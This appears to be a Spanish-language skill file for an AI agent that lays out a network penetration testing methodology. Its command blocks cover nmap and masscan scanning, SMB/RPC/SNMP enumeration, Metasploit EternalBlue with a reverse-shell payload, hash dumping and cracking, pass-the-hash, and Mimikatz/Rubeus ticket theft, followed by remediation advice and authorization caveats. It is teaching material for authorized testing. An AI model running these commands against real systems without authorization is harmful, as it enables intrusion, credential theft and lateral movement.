---
name: network-penetration-testing
description: Habilidades profesionales y metodología para pruebas de penetración en redes
version: 1.0.0
---

# Pruebas de penetración en redes

## Descripción general

Las pruebas de penetración en redes son un paso importante para evaluar la seguridad de la infraestructura de red. Esta habilidad proporciona metodologías, herramientas y mejores prácticas para el pentesting de redes.

## Alcance de las pruebas

### 1. Recopilación de información

**Elementos a verificar:**
- Topología de red
- Descubrimiento de hosts
- Escaneo de puertos
- Identificación de servicios

### 2. Escaneo de vulnerabilidades

**Elementos a verificar:**
- Vulnerabilidades del sistema
- Vulnerabilidades de servicios
- Errores de configuración
- Contraseñas débiles

### 3. Explotación de vulnerabilidades

**Elementos a verificar:**
- Ejecución remota de código
- Escalada de privilegios
- Movimiento lateral
- Persistencia

## Recopilación de información

### Escaneo de red

**Uso de Nmap:**
```bash
# Descubrimiento de hosts
nmap -sn 192.168.1.0/24

# Escaneo de puertos
nmap -sS -p- 192.168.1.100

# Identificación de servicios
nmap -sV -sC 192.168.1.100

# Identificación del sistema operativo
nmap -O 192.168.1.100

# Escaneo completo
nmap -sS -sV -sC -O -p- 192.168.1.100
```

**Uso de Masscan:**
```bash
# Escaneo rápido de puertos
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### Enumeración de servicios

**Enumeración SMB:**
```bash
# Enumerar recursos compartidos SMB
smbclient -L //192.168.1.100 -N

# Enumerar usuarios SMB
enum4linux -U 192.168.1.100

# Usar scripts de nmap
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
```

**Enumeración RPC:**
```bash
# Enumerar servicios RPC
rpcclient -U "" -N 192.168.1.100

# Usar scripts de nmap
nmap --script rpc-enum 192.168.1.100
```

**Enumeración SNMP:**
```bash
# Escaneo SNMP
snmpwalk -v2c -c public 192.168.1.100

# Usar onesixtyone
onesixtyone -c wordlist.txt 192.168.1.0/24
```

## Escaneo de vulnerabilidades

### Uso de Nessus

```bash
# Iniciar Nessus
# Acceder a la interfaz web
# Crear tarea de escaneo
# Analizar resultados del escaneo
```

### Uso de OpenVAS

```bash
# Iniciar OpenVAS
gvm-setup

# Acceder a la interfaz web
# Crear tarea de escaneo
# Analizar resultados del escaneo
```

### Uso de scripts de Nmap

```bash
# Escaneo de vulnerabilidades
nmap --script vuln 192.168.1.100

# Escaneo de vulnerabilidad específica
nmap --script smb-vuln-ms17-010 192.168.1.100

# Todos los scripts
nmap --script all 192.168.1.100
```

## Explotación de vulnerabilidades

### Metasploit

**Uso básico:**
```bash
# Iniciar Metasploit
msfconsole

# Buscar vulnerabilidad
search ms17-010

# Usar módulo
use exploit/windows/smb/ms17_010_eternalblue

# Configurar parámetros
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444

# Ejecutar
exploit
```

**Post-explotación:**
```bash
# Obtener información del sistema
sysinfo

# Obtener privilegios
getsystem

# Migrar proceso
migrate <pid>

# Obtener hashes
hashdump

# Obtener contraseñas
run post/windows/gather/smart_hashdump
```

### Explotación de vulnerabilidades comunes

**EternalBlue:**
```bash
# Usar Metasploit
use exploit/windows/smb/ms17_010_eternalblue

# Usar herramienta independiente
python eternalblue.py 192.168.1.100
```

**BlueKeep:**
```bash
# Usar Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**SMBGhost:**
```bash
# Usar herramienta independiente
python smbghost.py 192.168.1.100
```

## Movimiento lateral

### Craqueo de contraseñas

**Uso de Hashcat:**
```bash
# Craquear hashes NTLM
hashcat -m 1000 hashes.txt wordlist.txt

# Craquear hashes LM
hashcat -m 3000 hashes.txt wordlist.txt

# Usar reglas
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
```

**Uso de John:**
```bash
# Craquear hashes
john hashes.txt

# Usar diccionario
john --wordlist=wordlist.txt hashes.txt

# Usar reglas
john --wordlist=wordlist.txt --rules hashes.txt
```

### Pass-the-Hash

**Uso de Impacket:**
```bash
# Pass-the-Hash SMB
python smbexec.py -hashes :<hash> domain/user@target

# Pass-the-Hash WMI
python wmiexec.py -hashes :<hash> domain/user@target

# Pass-the-Hash RDP
xfreerdp /u:user /pth:<hash> /v:target
```

### Pass-the-Ticket

**Uso de Mimikatz:**
```bash
# Extraer tickets
sekurlsa::tickets /export

# Inyectar ticket
kerberos::ptt ticket.kirbi
```

**Uso de Rubeus:**
```bash
# Solicitar ticket
Rubeus.exe asktgt /user:user /domain:domain /rc4:hash

# Inyectar ticket
Rubeus.exe ptt /ticket:ticket.kirbi
```

## Uso de herramientas

### Nmap

```bash
# Escaneo completo
nmap -sS -sV -sC -O -p- -T4 target

# Escaneo sigiloso
nmap -sS -T2 -f -D RND:10 target

# Escaneo UDP
nmap -sU -p- target
```

### Metasploit

```bash
# Iniciar framework
msfconsole

# Inicializar base de datos
msfdb init

# Importar resultados de escaneo
db_import nmap.xml

# Ver hosts
hosts

# Ver servicios
services
```

### Burp Suite

**Escaneo de red:**
1. Configurar proxy
2. Navegar por la red objetivo
3. Analizar tráfico
4. Escaneo activo

## Lista de verificación de pruebas

### Recopilación de información
- [ ] Descubrimiento de topología de red
- [ ] Descubrimiento de hosts
- [ ] Escaneo de puertos
- [ ] Identificación de servicios
- [ ] Identificación del sistema operativo

### Escaneo de vulnerabilidades
- [ ] Escaneo de vulnerabilidades del sistema
- [ ] Escaneo de vulnerabilidades de servicios
- [ ] Verificación de errores de configuración
- [ ] Verificación de contraseñas débiles

### Explotación de vulnerabilidades
- [ ] Ejecución remota de código
- [ ] Escalada de privilegios
- [ ] Movimiento lateral
- [ ] Persistencia

## Problemas de seguridad comunes

### 1. Sistemas sin parches

**Problema:**
- El sistema no se actualiza a tiempo
- Existen vulnerabilidades conocidas
- Gestión inadecuada de parches

**Solución:**
- Instalar parches a tiempo
- Establecer un proceso de gestión de parches
- Actualizaciones de seguridad periódicas

### 2. Contraseñas débiles

**Problema:**
- Contraseñas predeterminadas
- Contraseñas simples
- Reutilización de contraseñas

**Solución:**
- Implementar políticas de contraseñas seguras
- Habilitar autenticación multifactor
- Cambiar contraseñas periódicamente

### 3. Puertos abiertos

**Problema:**
- Apertura de puertos innecesarios
- Exposición de servicios
- Errores de configuración del firewall

**Solución:**
- Cerrar puertos innecesarios
- Implementar reglas de firewall
- Usar acceso VPN

### 4. Errores de configuración

**Problema:**
- Configuración predeterminada
- Privilegios excesivos
- Configuración inadecuada de servicios

**Solución:**
- Línea base de configuración de seguridad
- Principio de mínimo privilegio
- Revisión periódica de la configuración

## Mejores prácticas

### 1. Recopilación de información

- Escaneo completo
- Verificación con múltiples herramientas
- Registrar hallazgos
- Analizar resultados

### 2. Explotación de vulnerabilidades

- Pruebas autorizadas
- Impacto mínimo
- Registrar operaciones
- Limpieza oportuna

### 3. Redacción de informes

- Registro detallado
- Calificación de riesgos
- Sugerencias de remediación
- Pasos de verificación

## Consideraciones

- Realizar pruebas solo en entornos autorizados
- Evitar afectar los sistemas de producción
- Cumplir con las leyes y regulaciones
- Proteger los datos de las pruebas